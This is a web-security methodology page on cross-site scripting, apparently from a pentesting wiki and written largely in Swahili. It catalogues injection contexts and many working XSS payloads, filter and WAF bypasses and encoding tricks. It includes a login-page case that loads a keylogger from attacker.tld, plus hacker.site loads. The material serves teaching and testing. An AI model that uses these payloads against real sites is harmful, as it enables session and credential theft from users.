# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## Methodolojia

1. Angalia kama **kima yoyote unachokidhibiti** (_parameters_, _path_, _headers_?, _cookies_?) kinareflektwa katika HTML au **kinatumika** na code ya **JS**.
2. **Tafuta muktadha** ambapo kinareflektwa/kinatumika.
3. Ikiwa **kinareflektwa**
1. Angalia **ni alama gani unaweza kutumia** na kulingana na hilo, andaa payload:
1. Katika **raw HTML**:
1. Je, unaweza kuunda tagi mpya za HTML?
2. Je, unaweza kutumia events au attributes zinazounga mkono protocol ya `javascript:`?
3. Je, unaweza kuzuia protections?
4. Je, maudhui ya HTML yanatafsiriwa na engine yoyote ya client side JS (_AngularJS_, _VueJS_, _Mavo_...), unaweza kudanganya kutumia [**Client Side Template Injection**](../client-side-template-injection-csti.md).
5. Ikiwa huwezi kuunda tagi za HTML zinazotekeleza code ya JS, je, unaweza kutumia [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html)?
2. Ndani ya **tagi ya HTML**:
1. Je, unaweza kutoka kwenye muktadha wa attribute na kurudi raw HTML?
2. Je, unaweza kuunda events/attributes mpya za kutekeleza code ya JS?
3. Je, attribute ambapo umefungwa inasaidia utekelezaji wa JS?
4. Je, unaweza kuzuia protections?
3. Ndani ya **JavaScript code**:
1. Je, unaweza kutoroka tagi ya `<script>`?
2. Je, unaweza kutoroka string na kutekeleza JS tofauti?
3. Je, input zako ziko katika template literals ``?
4. Je, unaweza kuzuia protections?
4. Javascript **function** inayotekelezwa
1. Unaweza kueleza jina la function kwa kuitekeleza. mfano: `?callback=alert(1)`
4. Ikiwa **inatumika**:
1. Unaweza ku-exploit **DOM XSS**, angalia kwa makini jinsi input yako inadhibitiwa na ikiwa **input yako inayodhibitiwa inatumiwa na sink yoyote.**

Unapofanya kazi na XSS ngumu unaweza kuvutiwa kujua kuhusu:


{{#ref}}
debugging-client-side-js.md
{{#endref}}

## Thamani zinazoreflektwa

Ili kuweza ku-exploit XSS jambo la kwanza unalotakiwa kulipata ni **thamani unayodhibiti inayoreflektwa** kwenye ukurasa wa wavuti.

- **Intermediately reflected**: Ikiwa unagundua kwamba thamani ya parameter au hata path inareflektwa kwenye ukurasa wa wavuti unaweza ku-exploit **Reflected XSS**.
- **Stored and reflected**: Ikiwa unagundua kwamba thamani unayodhibiti imehifadhiwa kwenye server na inareflektwa kila unapoingiza ukurasa unaweza ku-exploit **Stored XSS**.
- **Accessed via JS**: Ikiwa unagundua kwamba thamani unayodhibiti inapatikana kwa kutumia JS unaweza ku-exploit **DOM XSS**.

## Muktadha

Unapojaribu ku-exploit XSS jambo la kwanza unalotakiwa kujua ni **wapi input yako inareflektwa**. Kulingana na muktadha, utaweza kutekeleza code ya JS kwa njia mbalimbali.

### HTML mbichi

Kama input yako **inareflektwa kwenye HTML mbichi** utaalamuza kutumia baadhi ya **tagi za HTML** ili kutekeleza code ya JS: `<img , <iframe , <svg , <script` ... hizi ni baadhi tu ya tagi nyingi za HTML unazoweza kutumia.\
Pia, kumbuka [Client Side Template Injection](../client-side-template-injection-csti.md).

### Ndani ya attribute za tagi za HTML

Kama input yako inareflektwa ndani ya thamani ya attribute ya tagi unaweza kujaribu:

1. **Kutoka kwenye attribute na kutoka kwenye tagi** (kisha utakuwa kwenye raw HTML) na kuunda tagi mpya za HTML za ku-abuse: `"><img [...]`
2. Ikiwa **unaweza kutoka kwenye attribute lakini si kutoka kwenye tagi** (`>` ime-encoded au imeondolewa), kulingana na tagi unaweza **kuunda event** inayotekeleza JS: `" autofocus onfocus=alert(1) x="`
3. Ikiwa **huwezi kutoka kwenye attribute** (`"` ina-encode au imeondolewa), basi kulingana na **attribute gani** thamani yako inareflektwa ndani yake **ukiwa unadhibiti thamani yote au sehemu tu** utaweza kuibaisha. Kwa **mfano**, ikiwa unadhibiti event kama `onclick=` utaweza kufanya itekeleze code yoyote wakati inabofushwa. Mfano mwingine wa kuvutia ni attribute `href`, ambapo unaweza kutumia protocol ya `javascript:` kutekeleza code: **`href="javascript:alert(1)"`**
4. Ikiwa input yako inareflektwa ndani ya "**unexpoitable tags**" unaweza kujaribu mbinu ya **`accesskey`** ku-abuse uharibifu (utahitaji aina ya social engineering kutekeleza hili): **`" accesskey="x" onclick="alert(1)" x="`**

#### Attribute-only login XSS behind WAFs

Ukurasa wa login wa SSO wa kampuni ulireflect parameter ya OAuth `service` ndani ya attribute ya `href` ya `<a id="forgot_btn" ...>`. Ingawa `<` na `>` zili-HTML-encode, nukuu za wawili haziku-encode, hivyo mshambuliaji angeweza kufunga attribute na kutumia element ileile kuingiza handlers kama `" onfocus="payload" x="`.

1. **Ingiza handler:** Payload rahisi kama `onclick="print(1)"` zilizuia, lakini WAF iliangalia tu tamko la kwanza la JavaScript katika inline attributes. Kuweka ifadashi isiyo hatari iliyozungukwa na parenthesis, kisha semicolon, kuliruhusu payload halisi kutekelezwa: `onfocus="(history.length);malicious_code_here"`.
2. **Itumikishe moja kwa moja:** Browsers zinafanya focus element yoyote ambayo `id` yake inafanana na fragment, hivyo kuongezea `#forgot_btn` kwenye URL ya exploit kulazimisha anchor ifuate focus kwenye kupakia ukurasa na kuendesha handler bila hitaji la kubofya.
3. **Fanya stub ya inline iwe ndogo:** Target tayari ilikuwa na jQuery. Handler ilihitaji tu kuanzisha request kupitia `$.getScript(...)` wakati keylogger kamili uliishi kwenye server ya mshambuliaji.

**Kuunda strings bila nukuu**

Single quotes zilirudishwa zikiwa URL-encoded na double quotes zilizokuwepo ziliharibu attribute, hivyo payload ilitengeneza kila string kwa kutumia `String.fromCharCode`. Kazi ya kusaidia inafanya iwe rahisi kubadilisha URL yoyote kuwa char codes kabla ya kuiweka kwenye attribute:
```javascript
function toCharCodes(str){
return `const url = String.fromCharCode(${[...str].map(c => c.charCodeAt(0)).join(',')});`
}
console.log(toCharCodes('https://attacker.tld/keylogger.js'))
```
Sifa iliyotokana ilionekana kama:
```html
onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function(){}"
```
**Kwa nini hili linaiba nyaraka za utambulisho**

Script ya nje (iliyopakiwa kutoka kwa host inayodhibitiwa na mshambuliaji au Burp Collaborator) ilishikilia `document.onkeypress`, ika-buffer vibofyo vya kibodi, na kila sekunde ilituma `new Image().src = collaborator_url + keys`. Kwa sababu XSS inaonekana tu kwa watumiaji wasiothibitishwa, kitendo hatarishi ni fomu ya kuingia yenyewe—mshambuliaji anafanya keylogs majina ya watumiaji na nywila hata kama mwathiriwa hakabonyeza "Login".

Mfano wa ajabu wa Angular kutekeleza XSS ikiwa unadhibiti jina la darasa:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### Inside JavaScript code

Katika kesi hii ingizo lako linaonyeshwa kati ya **`<script> [...] </script>`** tags za ukurasa wa HTML, ndani ya faili `.js` au ndani ya attribute inayotumia protocol ya **`javascript:`**:

- Ikiwa linaonyeshwa kati ya **`<script> [...] </script>`** tags, hata kama ingizo lako liko ndani ya aina yoyote ya nukuu, unaweza kujaribu kuingiza `</script>` na kutoroka katika muktadha huu. Hii inafanya kazi kwa sababu **kivinjari kitatangulia kuchambua tags za HTML** kisha yaliyomo, kwa hivyo haitagundua kuwa tag uliyoiingiza `</script>` iko ndani ya msimbo wa HTML.
- Ikiwa linaonyeshwa **ndani ya JS string** na ujanja uliopita haufanyi kazi utahitaji **kutoka** kwenye string, **kutekeleza** msimbo wako na **kujenga tena** msimbo wa JS (kama kuna kosa, hautatekelezwa:
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- Ikiwa linaonyeshwa ndani ya template literals unaweza **embed JS expressions** ukitumia `${ ... }` syntax: `` var greetings = `Hello, ${alert(1)}` ``
- **Unicode encode** inafanya kazi kuandika **valid javascript code**:
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting inarejelea fursa ya **kutangaza functions, variables au classes baada ya kutumika ili uweze kutumia matukio ambapo XSS inatumia variables au functions ambazo hazijatangazwa.**\
**Angalia ukurasa ufuatao kwa habari zaidi:**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

Kurasa nyingi za wavuti zina endpoints ambazo **zinakubali kama parameter jina la function ya kutekeleza**. Mfano wa kawaida unaoonekana katika mazingira ni kama: `?callback=callbackFunc`.

Njia nzuri ya kugundua ikiwa kitu kinachotolewa moja kwa moja na mtumiaji kinajaribu kutekelezwa ni **kubadilisha thamani ya param** (kwa mfano kuwa 'Vulnerable') na kuangalia kwenye console kwa makosa kama:

![](<../../images/image (711).png>)

Ikiwa ni vunjivu, unaweza kuweza **kuamsha alert** kwa kutuma tu thamani: **`?callback=alert(1)`**. Hata hivyo, ni kawaida kwa endpoints hizi **kuhakiki maudhui** ili kuruhusu tu herufi, namba, nukta na underscores (**`[\w\._]`**).

Hata hivyo, hata kwa kikomo hicho bado inawezekana kufanya baadhi ya vitendo. Hii ni kwa sababu unaweza kutumia characters halali hizo kufikia element yoyote katika DOM:

![](<../../images/image (747).png>)

Baadhi ya functions zinazotumika kwa hili:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
Unaweza pia kujaribu **kusababisha Javascript functions** moja kwa moja: `obj.sales.delOrders`.

Hata hivyo, kawaida endpoints zinazotekeleza function iliyoashiriwa ni endpoints zenye DOM isiyo na mengi ya kuvutia, **pages nyingine katika same origin** zitakuwa na **DOM ya kuvutia zaidi** kwa ajili ya kufanya vitendo zaidi.

Kwa hiyo, ili **kuabusu vulnerability hii katika DOM tofauti** exploit ya **Same Origin Method Execution (SOME)** iliundwa:


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

Kuna **JS code** inayotumia kwa njia isiyo salama baadhi ya **data zinazoendeshwa na mshambuliaji** kama `location.href`. Mshambuliaji anaweza kutumia hili kutekeleza JS yoyote isiyokusudiwa.


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

Aina hizi za XSS zinaweza kupatikana **kila mahali**. Hazitegemei tu unyonyaji wa client wa web application bali zinategemea **muktadha wowote**. Aina hizi za **tekekeleza JavaScript yoyote** zinaweza hata kutumiwa kupata **RCE**, **kusoma** **mafaili** **yoyote** katika clients na servers, na mengineyo.\
Baadhi ya **mifano**:


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Kuingiza ndani ya raw HTML

Unapoingiza input yako na inarudishwa **ndani ya HTML page** au unaweza kutoroka na kuingiza HTML code katika muktadha huu, jambo la **kwanza** unalohitaji kufanya ni kuangalia kama unaweza kutumia `<` kuunda tags mpya: Jaribu tu **kuonyesha** char hiyo na angalia kama inafanyiwa **HTML encoded** au **kufutwa** au ikiwa inarudishwa **bila mabadiliko**. **Ni katika kesi ya mwisho tu utaweza kuitekeleza**.\
Kwa kesi hizi pia **kumbuka** [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**\
_**Note: A HTML comment can be closed using\*\***\***\*`-->`\*\***\***\*or \*\***`--!>`\*\*_

Katika kesi hii na ikiwa hakuna black/whitelisting inatumiwa, unaweza kutumia payloads kama:
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
Lakini, ikiwa tags/attributes black/whitelisting inatumiwa, utahitaji **brute-force tags** unazoweza kuunda.\
Mara utakapogundua **tags zinazoruhusiwa**, utahitaji **brute-force attributes/events** ndani ya tags halali ulizopata ili kuona jinsi ya kushambulia context.

### Tags/Events brute-force

Nenda kwenye [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) na bofya _**Copy tags to clipboard**_. Kisha, tuma zote kwa kutumia Burp intruder na angalia kama kuna tags yoyote ambayo WAF haikutambua kama hatari. Mara utakapogundua tags unazoweza kutumia, unaweza **brute force all the events** kwa kutumia tags halali (kivinjari sawa cha wavuti bofya _**Copy events to clipboard**_ na fuata taratibu zile zile kama hapo awali).

### Custom tags

Ikiwa hukupata tag yoyote halali ya HTML, unaweza kujaribu kuunda custom tag na kutekeleza JS code kwa kutumia attribute `onfocus`. Katika request ya XSS, unahitaji kumalizia URL na `#` ili kufanya ukurasa **focus on that object** na **execute** code:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Blacklist Bypasses

Ikiwa aina fulani ya blacklist inatumiwa, unaweza kujaribu ku-bypass kwa mbinu za kuchekesha:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### Length bypass (small XSSs)

> [!NOTE] > **Zaidi ya XSS ndogo kwa mazingira tofauti** payload [**zinaweza kupatikana hapa**](https://github.com/terjanq/Tiny-XSS-Payloads) na [**hapa**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
Ya mwisho inatumia 2 unicode characters ambazo zinaongezeka hadi 5: telsr\
Zaidi ya characters hizi unaweza kuziona [here](https://www.unicode.org/charts/normalization/).\
Ili kuangalia ni characters gani zimegawanywa angalia [here](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

If in order to exploit the vulnerability you need the **user to click a link or a form** with prepopulated data you could try to [**abuse Clickjacking**](../clickjacking.md#xss-clickjacking) (if the page is vulnerable).

### Impossible - Dangling Markup

If you just think that **it's impossible to create an HTML tag with an attribute to execute JS code**, you should check [**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html)because you could **exploit** the vulnerability **without** executing **JS** code.

## Kuingiza ndani ya HTML tag

### Ndani ya tag/escaping from attribute value

Ikiwa uko **inside a HTML tag**, kitu cha kwanza unachoweza kujaribu ni **escape** kutoka kwenye tag na kutumia baadhi ya techniques zilizoelezwa katika the [previous section](#injecting-inside-raw-html) ili kuendesha JS code.\
Ikiwa **you cannot escape from the tag**, unaweza kuunda attributes mpya ndani ya tag kujaribu kuendesha JS code, kwa mfano kwa kutumia payload kama (_note that in this example double quotes are use to escape from the attribute, you won't need them if your input is reflected directly inside the tag_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**Matukio ya mitindo**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### Within the attribute

Hata kama huwezi **kutoroka kutoka kwenye attribute** (`"` inapokodishwa au kufutwa), kulingana na **attribute gani** thamani yako inaonekana ndani yake **na kama unadhibiti thamani yote au sehemu tu** utaweza kuitumia vibaya. Kwa **mfano**, kama unadhibiti event kama `onclick=` utaweza kuifanya itekeleze code yoyote inapobonyezwa.\
Mfano mwingine wa kuvutia ni attribute `href`, ambapo unaweza kutumia protocol ya `javascript:` kutekeleza code yoyote: **`href="javascript:alert(1)"`**

**Bypass inside event using HTML encoding/URL encode**

Tabia za **HTML encoded characters** ndani ya thamani ya HTML tags attributes zinatafsiriwa wakati wa runtime. Kwa hivyo kitu kama kilicho hapa chini kitakuwa halali (payload iko katika bold): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

Kumbuka kwamba **any kind of HTML encode is valid**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**Kumbuka kwamba URL encode pia itafanya kazi:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**Bypass ndani ya tukio kwa kutumia Unicode encode**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### Protokoli Maalum ndani ya attribute

Huko unaweza kutumia protokoli **`javascript:`** au **`data:`** kwa sehemu fulani ili **kutekeleza msimbo wa JS wa hiari**. Baadhi zitahitaji mwingiliano wa mtumiaji; baadhi hazitahitaji.
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**Maeneo ambapo unaweza kuingiza protokoli hizi**

**Kwa ujumla** protokoli ya `javascript:` inaweza **kutumika katika tag yoyote inayokubali sifa `href`** na katika **tag nyingi zinazokubali sifa `src`** (lakini si `<img>`)
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**Triki nyingine za obfuscation**

_**Katika kesi hii HTML encoding na Unicode encoding trick kutoka sehemu iliyopita pia zinatumika kwa sababu uko ndani ya attribute.**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
Zaidi ya hayo, kuna nyingine **mbinu nzuri** kwa kesi hizi: **Even if your input inside `javascript:...` is being URL encoded, it will be URL decoded before it's executed.** Kwa hiyo, ikiwa unahitaji **escape** kutoka kwa **string** ukitumia **single quote** na unaona kwamba **it's being URL encoded**, kumbuka kwamba **it doesn't matter,** it will be **interpreted** as a **single quote** during the **execution** time.
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
Kumbuka kwamba ikiwa utajaribu **kutumia zote mbili** `URLencode + HTMLencode` kwa mpangilio wowote ili ku-encode **payload** **haitafanya kazi**, lakini unaweza **kuvichanganya ndani ya payload**.

**Kutumia Hex na Octal encode na `javascript:`**

Unaweza kutumia **Hex** na **Octal encode** ndani ya `src` attribute ya `iframe` (angalau) ili kutangaza **HTML tags to execute JS**:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
Ikiwa unaweza kuingiza URL yoyote katika tagi yoyote ya **`<a href=`** ambayo ina sifa **`target="_blank" and rel="opener"`**, angalia **ukurasa ufuatao ili exploit tabia hii**:

{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### on Event Handlers Bypass

Kwanza angalia ukurasa huu ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) kwa ajili ya **"on" event handlers** zenye manufaa.\ Ikiwa kuna blacklist inayokuzuia kuunda event handlers hizi unaweza kujaribu bypasses zifuatazo:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS katika "Unexploitable tags" (hidden input, link, canonical, meta)

Kutoka [**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **sasa inawezekana kutumia vibaya hidden inputs kwa:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
Na katika **meta tags**:
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
Kutoka [**here**](https://portswigger.net/research/xss-in-hidden-input-fields): Unaweza kutekeleza **XSS payload inside a hidden attribute**, mradi tu uweze **kumsadikisha** **victim** abonyeze **mchanganyiko wa funguo**. Kwenye Firefox Windows/Linux mchanganyiko wa funguo ni **ALT+SHIFT+X** na kwenye OS X ni **CTRL+ALT+X**. Unaweza kubainisha mchanganyiko tofauti wa funguo kwa kutumia ufunguo tofauti katika access key attribute. Hapa kuna vector:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**XSS payload itakuwa kama hii: `" accesskey="x" onclick="alert(1)" x="`**

### Blacklist Bypasses

Mbinu kadhaa za kutumia encoding tofauti zimeonyeshwa tayari ndani ya sehemu hii. Rudi **kujifunza wapi unaweza kutumia:**

- **HTML encoding (HTML tags)**
- **Unicode encoding (can be valid JS code):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**Bypasses for HTML tags and attributes**

Soma [Blacklist Bypasses of the previous section](#blacklist-bypasses).

**Bypasses for JavaScript code**

Soma J[avaScript bypass blacklist of the following section](#javascript-bypass-blacklists-techniques).

### CSS-Gadgets

Iwapo umepata **XSS katika sehemu ndogo sana** ya wavuti inayohitaji aina fulani ya mwingiliano (labda link ndogo katika footer yenye element onmouseover), unaweza kujaribu **kubadili eneo ambalo element hiyo inachukua** ili kuongeza uwezekano wa link kuchaguliwa.

Kwa mfano, unaweza kuongeza styling kwenye element kama: `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

Lakini, ikiwa WAF inachuja attribute ya style, unaweza kutumia CSS Styling Gadgets, kwa hivyo ikiwa unapata, kwa mfano

> .test {display:block; color: blue; width: 100%\}

na

> \#someid {top: 0; font-family: Tahoma;}

Sasa unaweza kubadilisha link yetu na kuiweka katika fomu

> \<a href="" id=someid class=test onclick=alert() a="">

Triki hii ilichukuliwa kutoka kwa [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## Kuingiza ndani ya JavaScript code

Katika kesi hizi input yako itarudishwa ndani ya JS code ya faili `.js` au kati ya `<script>...</script>` tags au kati ya HTML events zinazoweza kuendesha JS code au kati ya attributes zinazokubali protocol ya `javascript:`.

### Kutoroka \<script> tag

Ikiwa code yako imeingizwa ndani ya `<script> [...] var input = 'reflected data' [...] </script>`, unaweza kwa urahisi **kutoroka kufunga tag ya `<script>`**:
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
Kumbuka kwamba katika mfano huu **hatuja hata kufunga nukuu moja**. Hii ni kwa sababu **uchambuzi wa HTML unafanywa kwanza na browser**, ambao unajumuisha kutambua elementi za ukurasa, ikiwa ni pamoja na blocks za script. Uchambuzi wa JavaScript ili kuelewa na kutekeleza script zilizowekwa ndani hufanywa tu baadaye.

### Ndani ya JS code

Ikiwa `<>` zinasafishwa bado unaweza **escape the string** ambapo input yako iko **located** na **execute arbitrary JS**. Ni muhimu **fix JS syntax**, kwa sababu ikiwa kuna makosa yoyote, JS code haitotekelezwa:
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

Wakati user input inapoweka ndani ya quoted JavaScript string (mf., server-side echo katika inline script), unaweza kumaliza string, ku-inject code, na kurekebisha syntax ili parsing iendelee kuwa halali. Generic skeleton:
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
Mfano wa muundo wa URL wakati kigezo dhaifu kinaporudishwa ndani ya kamba ya JS:
```
?param=test";<INJECTION>;a="
```
Hii inatekeleza JS ya mshambulizi bila kuhitaji kugusa muktadha wa HTML (pure JS-in-JS). Unganisha na blacklist bypasses hapa chini wakati filters zinazuia maneno muhimu.

### Template literals ``

Ili kujenga **strings** mbali na nukta moja na nukta mbili, JS pia inakubali **backticks** **` `` `**. Hii inajulikana kama template literals kwa kuwa zinaruhusu **embedded JS expressions** kutumia syntax ya `${ ... }`.\  
Kwa hiyo, ikiwa unagundua kwamba input yako ina **reflected** ndani ya JS string inayotumia backticks, unaweza kutumia syntax `${ ... }` kuendesha **arbitrary JS code**:

Hii inaweza **kutumiwa vibaya** kwa kutumia:
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### Iliyokodishwa code execution
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### Deliverable payloads na eval(atob()) na nuances za scope

Kwa kufupisha URLs na kuepuka vichujio rahisi vya maneno, unaweza ku-encode logic yako halisi kwa base64 na kuitekeleza kwa `eval(atob('...'))`. Iwapo vichujio rahisi vya maneno vinazuia vitambulisho kama `alert`, `eval`, au `atob`, tumia Unicode-escaped identifiers ambazo zinakusanyika sawa katika browser lakini zinaepuka vichujio vya kulinganisha mfuatano wa herufi:
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
